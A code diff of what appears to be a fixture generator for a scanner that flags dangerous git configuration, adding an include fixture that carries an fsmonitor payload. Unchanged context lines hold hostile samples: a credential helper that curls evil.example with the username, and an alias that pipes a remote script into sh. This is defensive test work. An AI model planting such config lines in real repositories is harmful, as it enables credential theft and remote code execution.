@@ -58,8 +58,8 @@ const VULN_FIXTURES = {
   'sshcommand-override': { config: '[core]\n\tsshCommand = /tmp/ssh-wrapper.sh\n', expect: 'core-sshcommand' },
   'gitproxy': { config: '[core]\n\tgitProxy = /tmp/proxy.sh\n', expect: 'core-gitproxy' },
   'hookspath-in-repo': { config: '[core]\n\thooksPath = .devtools/hooks\n', expect: 'core-hookspath' },
-  'include-relative': { config: '[include]\n\tpath = .github/extra.gitconfig\n', expect: 'include-path' },
-  'includeif-relative': { config: '[includeIf "gitdir:./"]\n\tpath = ./.ci/config\n', expect: 'include-path' },
+  'include-unreachable': { config: '[include]\n\tpath = .github/extra.gitconfig\n', expect: 'include-not-followed' },
+  'includeif-outside-tree': { config: '[includeIf "gitdir:./"]\n\tpath = /etc/gitconfig-elsewhere\n', expect: 'include-not-followed' },
   'diff-external': { config: '[diff]\n\texternal = /tmp/diff-helper.sh\n', expect: 'diff-external' },
   'credential-helper-shell': { config: '[credential]\n\thelper = "!f() { curl -s https://evil.example/c?u=$1; }; f"\n', expect: 'credential-helper' },
   'alias-shell': { config: '[alias]\n\tst = !curl -s https://evil.example/x.sh | sh\n', expect: 'alias-shell' },
@@ -110,6 +110,11 @@ async function main() {
     await repo(VULN, name, { config: spec.config, hooks: spec.hooks });
   }
 
+  // Vulnerable: an include that IS reachable, carrying the payload one file away
+  const inc = await repo(VULN, 'include-payload', { config: '[include]\n\tpath = ../shared/build-flags.txt\n' });
+  await mkdir(path.join(inc, 'shared'), { recursive: true });
+  await writeFile(path.join(inc, 'shared', 'build-flags.txt'), '[core]\n\tfsmonitor = /tmp/payload.sh\n', 'utf-8');
+
   // Vulnerable: a repository-shipped hooks directory whose script pulls remote code
   await repo(VULN, 'hookspath-fetches-remote', {
     config: '[core]\n\thooksPath = .githooks\n',
@@ -130,7 +135,7 @@ async function main() {
   await writeFile(path.join(nestHost, 'examples', 'demo', '.git', 'config'), '[core]\n\tfsmonitor = ./run.sh\n', 'utf-8');
 
   const cleanCount = Object.keys(CLEAN_FIXTURES).length + 3;
-  const vulnCount = Object.keys(VULN_FIXTURES).length + 3;
+  const vulnCount = Object.keys(VULN_FIXTURES).length + 4;
   console.log(`fixtures: ${cleanCount} clean, ${vulnCount} vulnerable`);
 }
 
